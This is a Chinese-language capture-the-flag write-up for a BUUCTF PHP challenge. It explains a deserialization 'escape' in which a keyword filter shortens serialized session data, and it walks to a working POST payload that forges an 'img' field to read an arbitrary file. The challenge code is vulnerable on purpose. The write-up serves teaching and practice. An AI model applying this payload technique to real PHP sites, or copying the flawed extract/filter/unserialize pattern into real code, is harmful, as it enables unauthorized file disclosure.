日期：2026/5/13              题目：[安洵杯 2019]easy_serialize_php                    平台：BUUCTF
简介：
    这个漏洞基于php中反序列化逃逸，即根据在序列化的字符串中 } 代表结尾来实现攻击的
攻击过程：
    第一步：打开页面，有一段php代码如下
          <?php

          $function = @$_GET['f'];
          
          function filter($img){
              $filter_arr = array('php','flag','php5','php4','fl1g');
              $filter = '/'.implode('|',$filter_arr).'/i';
              return preg_replace($filter,'',$img);
          }
          
          
          if($_SESSION){
              unset($_SESSION);
          }
          
          $_SESSION["user"] = 'guest';
          $_SESSION['function'] = $function;
          
          extract($_POST);
          
          if(!$function){
              echo '<a href="index.php?f=highlight_file">source_code</a>';
          }
          
          if(!$_GET['img_path']){
              $_SESSION['img'] = base64_encode('guest_img.png');
          }else{
              $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
          }
          
          $serialize_info = filter(serialize($_SESSION));
          
          if($function == 'highlight_file'){
              highlight_file('index.php');
          }else if($function == 'phpinfo'){
              eval('phpinfo();'); //maybe you can find something in here!
          }else if($function == 'show_image'){
              $userinfo = unserialize($serialize_info);
              echo file_get_contents(base64_decode($userinfo['img']));
          }
          
    第二步：分析代码，可以看到重要的地方为1、extract($_POST); 2、$serialize_info = filter(serialize($_SESSION));
            3、$userinfo = unserialize($serialize_info);echo file_get_contents(base64_decode($userinfo['img']));  
            可以看出_SESSION很重要，可以先在1中给SEESION数组赋值任意字符，本想赋值一个_SESSION[img]=目标flag的文件路径的base64编码，这样最后就可以得到img指向的文件内容
            但是因为extract函数之后还会给_SEESION['img']赋值为base64_encode('guest_img.png');，所以这样没意义
    第三步：只能在序列化和反序列化中实现攻击。先写个php代码（如下），测试序列化和反序列化
            $Test['user'] = "root";
            $Test['aaa'] = "nihao";
            $Test['img'] = "ANSJJJNKJDBC";
            
            $a = serialize($Test);
            echo "Serialized: " . $a . "\n"; 

            结果为Serialized: a:3:{s:4:"user";s:4:"root";s:3:"aaa";s:5:"nihao";s:3:"img";s:12:"ANSJJJNKJDBC";}
            得知a:3中的3是3个元素的意思。s:4:"user";的意思是user的长度是4，并且这个数组的序列化是两两配对的，即user后面是root。
            现在思考将某个值改为以 } 结尾，这样就能提前结束并将后面的img挤掉，
            如将上面的序列化字符串变成 a:3:{s:4:"user";s:4:"root";s:3:"aaa";s:5:"nihao";}";s:3:"img";s:12:"ANSJJJNKJDBC";}
            要实现}结尾就得将$Test['aaa'] = "nihao";变成$Test[aaa] = nihao";}，但是这样的问题是s:5:"nihao"变成了s:8:"nihao";}"，这样长度不对 ，}不作为结束的标志，而是作为字符串的一部分
     第四步：回到这个漏洞中，我根据代码上传参数f=phpinfo, 可以找到可疑文件d0g3_f1ag.php，所以使用base64编码它为 ZDBnM19mMWFnLnBocA== ，将这个编码作为img
             根据第三步的结论，我可以使用POST方式上传一个参数_SESSION[aaa]=s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}  之类的，这样有机会将后续的img挤掉
              但是问题和第三步一样，s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";} 是被视为一个整体，因为他的前面会有个s:31:（假设为31的长度）
              最终只能得到： a:2:{s:3:"aaa";s:31:"s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img"....}, 问题出在s:31上面，假如这个消失或者和前面的形成一个aaa";s:31:的整体就好了
     第五步：因为有个filter方法会将php，flag之类的变成空。所以可以将aaa换成php，这样php成空，前面的s：3找到";s为新的键，但我希望的是将";s:31:视为一个整体，所以将原本的aaa换成phpflag,这样成为
            phpflag成空，s:7找到";s:31:为整体，之后的s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==开始变得每个都独立，还应该加上;和一个任意的s:1:"1"（因为键值对是对双的），
     第六步：构建payload：_SESSION[phpflag] =;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
            得到：
            <img width="1525" height="373" alt="image" src="https://github.com/user-attachments/assets/6fe519b2-f0c9-45f7-9ab2-a33928190e00" />

            在用同样的方式得到该文件的内容：
            <img width="1653" height="487" alt="image" src="https://github.com/user-attachments/assets/b1b67843-c3e8-4fc4-9416-b3129645b6b1" />


            
            
       
